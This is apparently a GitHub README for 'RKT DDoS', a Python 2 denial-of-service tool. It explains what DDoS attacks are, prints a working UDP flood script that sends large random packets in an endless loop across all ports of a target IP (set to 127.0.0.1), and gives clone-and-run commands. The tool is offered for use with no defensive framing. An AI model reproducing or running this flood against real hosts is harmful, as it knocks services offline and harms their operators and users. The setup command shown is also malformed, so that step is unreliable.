[![MIT](https://img.shields.io/packagist/l/doctrine/orm.svg)](https://github.com/r3k4t/rktddos/blob/master/LICENSE) 
[![python](https://img.shields.io/badge/python-2.7-orange.svg)](https://www.python.org/download/releases/2.7/)
![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)

<h2>RKT DDoS</h2>

<h4>Author : RKT</h4>

### Descripton ###

![DDOS Attack-compressed](https://user-images.githubusercontent.com/69615463/96414395-b0326e00-120a-11eb-832a-a66f32b6f2dd.jpg)


### DDos(Distributed Denial-Of-Service) ###

A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.

DDoS attacks achieve effectiveness by utilizing multiple compromised computer systems as sources of attack traffic. Exploited machines can include computers and other networked resources such as IoT devices.

From a high level, a DDoS attack is like an unexpected traffic jam clogging up the highway, preventing regular traffic from arriving at its destination.


### Python DDoS Code(Basic) ###

>>>import socket
<br>
>>>import random
<br>
>>>rkt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
<br>
>>>bytes = random._urandom(51200)
<br>
>>>ip   = "127.0.0.1"
<br>
>>>port = 80
<br>
>>>sent = 0
<br>
>>>while True:
      <br>
>>> ...  rkt.sendto(bytes,(ip,port))
       <br>
>>> ...  sent = sent + 1
       <br>
>>> ...  port = port + 1
       <br>
>>> ...  print "SENT %s PACKET TO %s THROUGHT PORT:%s" % (sent,ip,port)
       <br>
>>> ...  if port == 65535:
       <br>   
>>> ...   port = 1
  

#### Tested On ###

<ul>
<li>Ubuntu</li>
<li>Kali Linux</li>
<li>Linuxmint</li>
<li>Parrot Os</li>
</ul>


### Setup ###

<ul>
<li>sudo pip2 install requirements.txt</li>
</ul> 

### Terminal Command ###

<ul>
<li>git clone https://github.com/r3k4t/rktddos.git</li>
<li>cd   rktddos          </li>
<li>sudo python2 rktddos.py</li>
</ul>

### Screentshots ###

![Screenshot at 2020-10-19 12-54-05](https://user-images.githubusercontent.com/69615463/96414279-8aa56480-120a-11eb-82c0-4833bd7dba4a.png)

Next

![Screenshot at 2020-10-19 12-54-22](https://user-images.githubusercontent.com/69615463/96414316-96912680-120a-11eb-8e82-7b68da167f4c.png)


Next


![Screenshot at 2020-10-19 12-54-27](https://user-images.githubusercontent.com/69615463/96414350-a14bbb80-120a-11eb-8a39-368429a790ef.png)







